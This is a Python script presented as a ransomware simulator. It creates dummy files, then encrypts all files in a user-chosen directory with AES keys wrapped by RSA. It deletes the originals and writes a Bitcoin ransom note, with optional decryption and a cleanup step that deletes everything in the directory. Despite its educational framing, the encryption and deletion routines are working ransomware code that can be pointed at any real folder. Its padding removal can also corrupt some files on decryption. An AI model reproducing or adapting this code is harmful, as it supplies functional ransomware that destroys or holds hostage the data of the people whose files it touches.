#!/usr/bin/env python
import os
import time
import logging
import argparse
import json
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import tqdm
import secrets
import base64

class RansomwareSimulator:
    def __init__(self, test_dir="./test_files", file_count=100, max_workers=4):
        self.test_dir = Path(test_dir)
        self.file_count = file_count
        self.max_workers = max_workers
        self.encrypted_files = []
        self.rsa_key_pair = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        self.public_key = self.rsa_key_pair.public_key()
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('ransomware_sim.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def generate_file_content(self, size_kb):
        """Generate random file content of specified size in KB"""
        return secrets.token_bytes(size_kb * 1024)

    def create_test_files(self):
        """Create dummy test files with varied content and types"""
        file_types = ['.txt', '.doc', '.pdf', '.jpg']
        try:
            self.test_dir.mkdir(exist_ok=True)
            self.logger.info(f"Created test directory: {self.test_dir}")
            
            for i in tqdm.tqdm(range(self.file_count), desc="Creating test files"):
                file_type = secrets.choice(file_types)
                file_size = secrets.randbelow(100) + 10  # 10-110KB
                file_path = self.test_dir / f"file{i}{file_type}"
                content = self.generate_file_content(file_size)
                file_path.write_bytes(content)
                
        except Exception as e:
            self.logger.error(f"Error creating test files: {e}")
            raise

    def encrypt_file(self, file_path):
        """Encrypt a single file using hybrid encryption (RSA + AES)"""
        try:
            if file_path.name == "RANSOM_NOTE.txt" or file_path.suffix == ".encrypted":
                return
                
            # Generate AES key for this file
            aes_key = secrets.token_bytes(32)
            iv = secrets.token_bytes(16)
            
            # Encrypt file content with AES
            cipher = Cipher(
                algorithms.AES(aes_key),
                modes.CBC(iv),
                backend=default_backend()
            )
            encryptor = cipher.encryptor()
            
            content = file_path.read_bytes()
            padded_content = content + b"\0" * (16 - len(content) % 16)
            encrypted_content = encryptor.update(padded_content) + encryptor.finalize()
            
            # Encrypt AES key with RSA
            encrypted_key = self.public_key.encrypt(
                aes_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            
            # Store encrypted content and metadata
            encrypted_path = file_path.with_suffix(file_path.suffix + ".encrypted")
            metadata = {
                'iv': base64.b64encode(iv).decode(),
                'encrypted_key': base64.b64encode(encrypted_key).decode()
            }
            
            with encrypted_path.open('wb') as f:
                f.write(json.dumps(metadata).encode() + b'\n')
                f.write(encrypted_content)
                
            file_path.unlink()
            self.encrypted_files.append(encrypted_path)
            self.logger.info(f"Encrypted: {file_path.name} -> {encrypted_path.name}")
            
        except Exception as e:
            self.logger.error(f"Error encrypting {file_path}: {e}")

    def encrypt_files(self):
        """Encrypt files in parallel"""
        try:
            files = [f for f in self.test_dir.glob("*") if f.suffix != ".encrypted"]
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                list(tqdm.tqdm(
                    executor.map(self.encrypt_file, files),
                    total=len(files),
                    desc="Encrypting files"
                ))
        except Exception as e:
            self.logger.error(f"Error during encryption: {e}")
            raise

    def decrypt_file(self, file_path):
        """Decrypt a single file"""
        try:
            with file_path.open('rb') as f:
                metadata = json.loads(f.readline().decode())
                encrypted_content = f.read()
                
            iv = base64.b64decode(metadata['iv'])
            encrypted_key = base64.b64decode(metadata['encrypted_key'])
            
            # Decrypt AES key with RSA
            aes_key = self.rsa_key_pair.decrypt(
                encrypted_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            
            # Decrypt content with AES
            cipher = Cipher(
                algorithms.AES(aes_key),
                modes.CBC(iv),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            decrypted_padded = decryptor.update(encrypted_content) + decryptor.finalize()
            decrypted_content = decrypted_padded.rstrip(b"\0")
            
            original_path = file_path.with_suffix('')
            original_path.write_bytes(decrypted_content)
            file_path.unlink()
            
            self.logger.info(f"Decrypted: {file_path.name} -> {original_path.name}")
            
        except Exception as e:
            self.logger.error(f"Error decrypting {file_path}: {e}")

    def decrypt_files(self):
        """Decrypt all encrypted files"""
        try:
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                list(tqdm.tqdm(
                    executor.map(self.decrypt_file, self.encrypted_files),
                    total=len(self.encrypted_files),
                    desc="Decrypting files"
                ))
        except Exception as e:
            self.logger.error(f"Error during decryption: {e}")
            raise

    def create_ransom_note(self):
        """Create a realistic ransom note"""
        ransom_note = """
        *** CRITICAL ALERT: YOUR FILES HAVE BEEN ENCRYPTED ***

        Your important files have been encrypted using military-grade RSA-2048 and AES-256 encryption.
        
        To recover your files:
        1. Send 1 BTC to: [Bitcoin Address Placeholder]
        2. Contact us at: recovery@simulation.onion
        3. Include your unique ID: {secrets.token_hex(16)}
        
        Payment must be received within 72 hours or the decryption key will be destroyed.
        
        WARNING: Do NOT attempt to decrypt files yourself or modify them.
        This is a simulation for educational purposes only.
        """
        try:
            (self.test_dir / "RANSOM_NOTE.txt").write_text(ransom_note)
            self.logger.info("Created ransom note")
        except Exception as e:
            self.logger.error(f"Error creating ransom note: {e}")
            raise

    def simulate_key_server(self):
        """Simulate storing encryption key on remote server"""
        key_data = {
            'public_key': self.public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            ).decode(),
            'timestamp': time.ctime()
        }
        self.logger.info(f"Simulated key server storage: {json.dumps(key_data, indent=2)}")

    def cleanup(self):
        """Clean up test directory and files"""
        try:
            for file_path in self.test_dir.glob("*"):
                file_path.unlink()
            self.test_dir.rmdir()
            self.logger.info(f"Cleaned up test directory: {self.test_dir}")
        except Exception as e:
            self.logger.error(f"Error during cleanup: {e}")
            raise

    def run_simulation(self, decrypt=False):
        """Run the complete ransomware simulation"""
        self.logger.info("Starting ransomware simulation...")
        try:
            self.create_test_files()
            self.encrypt_files()
            self.simulate_key_server()
            self.create_ransom_note()
            if decrypt:
                self.decrypt_files()
            self.logger.info("Ransomware simulation completed successfully")
        except Exception as e:
            self.logger.error(f"Simulation failed: {e}")
            raise

def main():
    parser = argparse.ArgumentParser(description="Ransomware Simulation Tool")
    parser.add_argument("--dir", default="./test_files", help="Test directory path")
    parser.add_argument("--count", type=int, default=10, help="Number of test files")
    parser.add_argument("--workers", type=int, default=4, help="Number of worker threads")
    parser.add_argument("--decrypt", action="store_true", help="Run decryption after encryption")
    
    args = parser.parse_args()
    
    simulator = RansomwareSimulator(
        test_dir=args.dir,
        file_count=args.count,
        max_workers=args.workers
    )
    
    try:
        simulator.run_simulation(decrypt=args.decrypt)
        if not args.decrypt:
            input("Press Enter to clean up...")
        simulator.cleanup()
    except KeyboardInterrupt:
        simulator.logger.warning("Simulation interrupted by user")
        simulator.cleanup()
    except Exception as e:
        simulator.logger.error(f"Unexpected error: {e}")
        simulator.cleanup()

if __name__ == "__main__":
    main()